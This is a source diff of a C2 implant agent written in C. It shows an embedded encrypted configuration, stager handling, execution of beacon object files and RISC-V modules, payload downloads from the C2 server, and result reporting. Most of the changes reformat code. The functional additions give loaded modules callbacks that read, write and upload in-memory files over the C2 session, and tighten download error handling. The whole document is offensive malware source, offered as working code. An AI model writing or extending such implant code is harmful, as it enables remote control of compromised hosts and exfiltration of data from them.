@@ -35,6 +35,9 @@
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 #include "bof.h"
 #endif
+#if C2_AGENT_ENABLE_BOF
+#include "bof_host.h"
+#endif
 #if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
 #include "module.h"
 #endif
@@ -75,9 +78,9 @@
 
 /* Weak defaults overridden by the generated config_embedded.c. An agent
  * built without a config links but cannot decrypt and exits at startup. */
-__attribute__((weak)) const uint8_t c2_embedded_config[] = { 0 };
+__attribute__((weak)) const uint8_t c2_embedded_config[] = {0};
 __attribute__((weak)) const size_t c2_embedded_config_len = 0;
-__attribute__((weak)) const uint8_t c2_magic_string[] = { 0 };
+__attribute__((weak)) const uint8_t c2_magic_string[] = {0};
 __attribute__((weak)) const size_t c2_magic_string_len = 0;
 __attribute__((weak)) const char c2_build_version[] = "N/A";
 
@@ -161,7 +164,7 @@ static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
   /* No in-place masker: a supervising parent reclaims the process instead. */
   if (cfg->is_run_by_stager && c2_agent_identity_supervisor_present())
     exit(0);
-  struct timespec ts = {(time_t)secs, 0 };
+  struct timespec ts = {(time_t)secs, 0};
   nanosleep(&ts, NULL);
 }
 
@@ -222,12 +225,7 @@ enum {
   DENT_OWNER = 5,
   DENT_PERM = 6,
 };
-enum {
-  FSTAT_NAME = 1,
-  FSTAT_PERM = 2,
-  FSTAT_CHECKSUM = 3,
-  FSTAT_SIZE = 4
-};
+enum { FSTAT_NAME = 1, FSTAT_PERM = 2, FSTAT_CHECKSUM = 3, FSTAT_SIZE = 4 };
 
 static void mode_string(mode_t m, char out[11]) {
   char type = '-';
@@ -244,9 +242,9 @@ static void mode_string(mode_t m, char out[11]) {
   else if (S_ISSOCK(m))
     type = 'S';
   out[0] = type;
-  static const mode_t bits[9] = { 0400, 0200, 0100, 0040, 0020,
-                                  0010, 0004, 0002, 0001 };
-  static const char rwx[9] = { 'r', 'w', 'x', 'r', 'w', 'x', 'r', 'w', 'x' };
+  static const mode_t bits[9] = {0400, 0200, 0100, 0040, 0020,
+                                 0010, 0004, 0002, 0001};
+  static const char rwx[9] = {'r', 'w', 'x', 'r', 'w', 'x', 'r', 'w', 'x'};
   for (int i = 0; i < 9; i++)
     out[1 + i] = (m & bits[i]) ? rwx[i] : '-';
   if (m & S_ISUID)
@@ -469,6 +467,8 @@ static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
   size_t len = 0;
   c2_status st =
       c2_session_download(s, c2_str_of(name, strlen(name)), buf, cap, &len);
+  if (st == C2_OK && len == 0)
+    st = C2_ERR_PROTO; /* the C2 refused or could not serve it: no bytes */
   if (st == C2_OK) {
     char key[512];
     size_t kl = c2_memfile_key(name, strlen(name), key, sizeof(key));
@@ -614,6 +614,9 @@ static void execute_bof(c2_agent_session *s, c2_memfile *mem,
   size_t packed_len = 0;
   char *result = NULL;
   c2_status st = C2_OK;
+  c2_bof_host_ctx host_ctx = {s, mem};
+  c2_bof_host host = {&host_ctx, c2_bof_host_read, c2_bof_host_write,
+                      c2_bof_host_upload, c2_bof_host_sha256};
   if (packed == NULL) {
     st = C2_ERR_NOMEM;
   } else if (tokenc > 0) {
@@ -623,7 +626,7 @@ static void execute_bof(c2_agent_session *s, c2_memfile *mem,
     st =
         c2_bof_run(loader, loader_len, bof, bof_len,
                    (export_name != NULL && export_name[0]) ? export_name : "go",
-                   packed, packed_len, &result);
+                   packed, packed_len, &host, &result);
   if (st == C2_OK && result != NULL) {
     obuf_append(out, result, strlen(result));
     free(result);
@@ -701,8 +704,11 @@ static void execute_rv(c2_agent_session *s, c2_memfile *mem,
   }
 
   char *result = NULL;
+  c2_bof_host_ctx host_ctx = {s, mem};
+  c2_bof_host host = {&host_ctx, c2_bof_host_read, c2_bof_host_write,
+                      c2_bof_host_upload, c2_bof_host_sha256};
   c2_status st = c2_rv_run(loader, loader_len, image, image_len, bof_args,
-                           bof_len, &result);
+                           bof_len, &host, &result);
   if (st == C2_OK && result != NULL) {
     obuf_append(out, result, strlen(result));
     free(result);
@@ -1151,7 +1157,7 @@ __attribute__((visibility("default"))) int main(void) {
         continue;
       TRACE("[agent] job received\n");
 
-      obuf out = { 0 };
+      obuf out = {0};
       dispatch(&m, &s, &mem, &out);
       (void)c2_session_send_result(&s, &msg, m.job_id, &m.cmd_slice,
                                    (const uint8_t *)out.p, out.len);
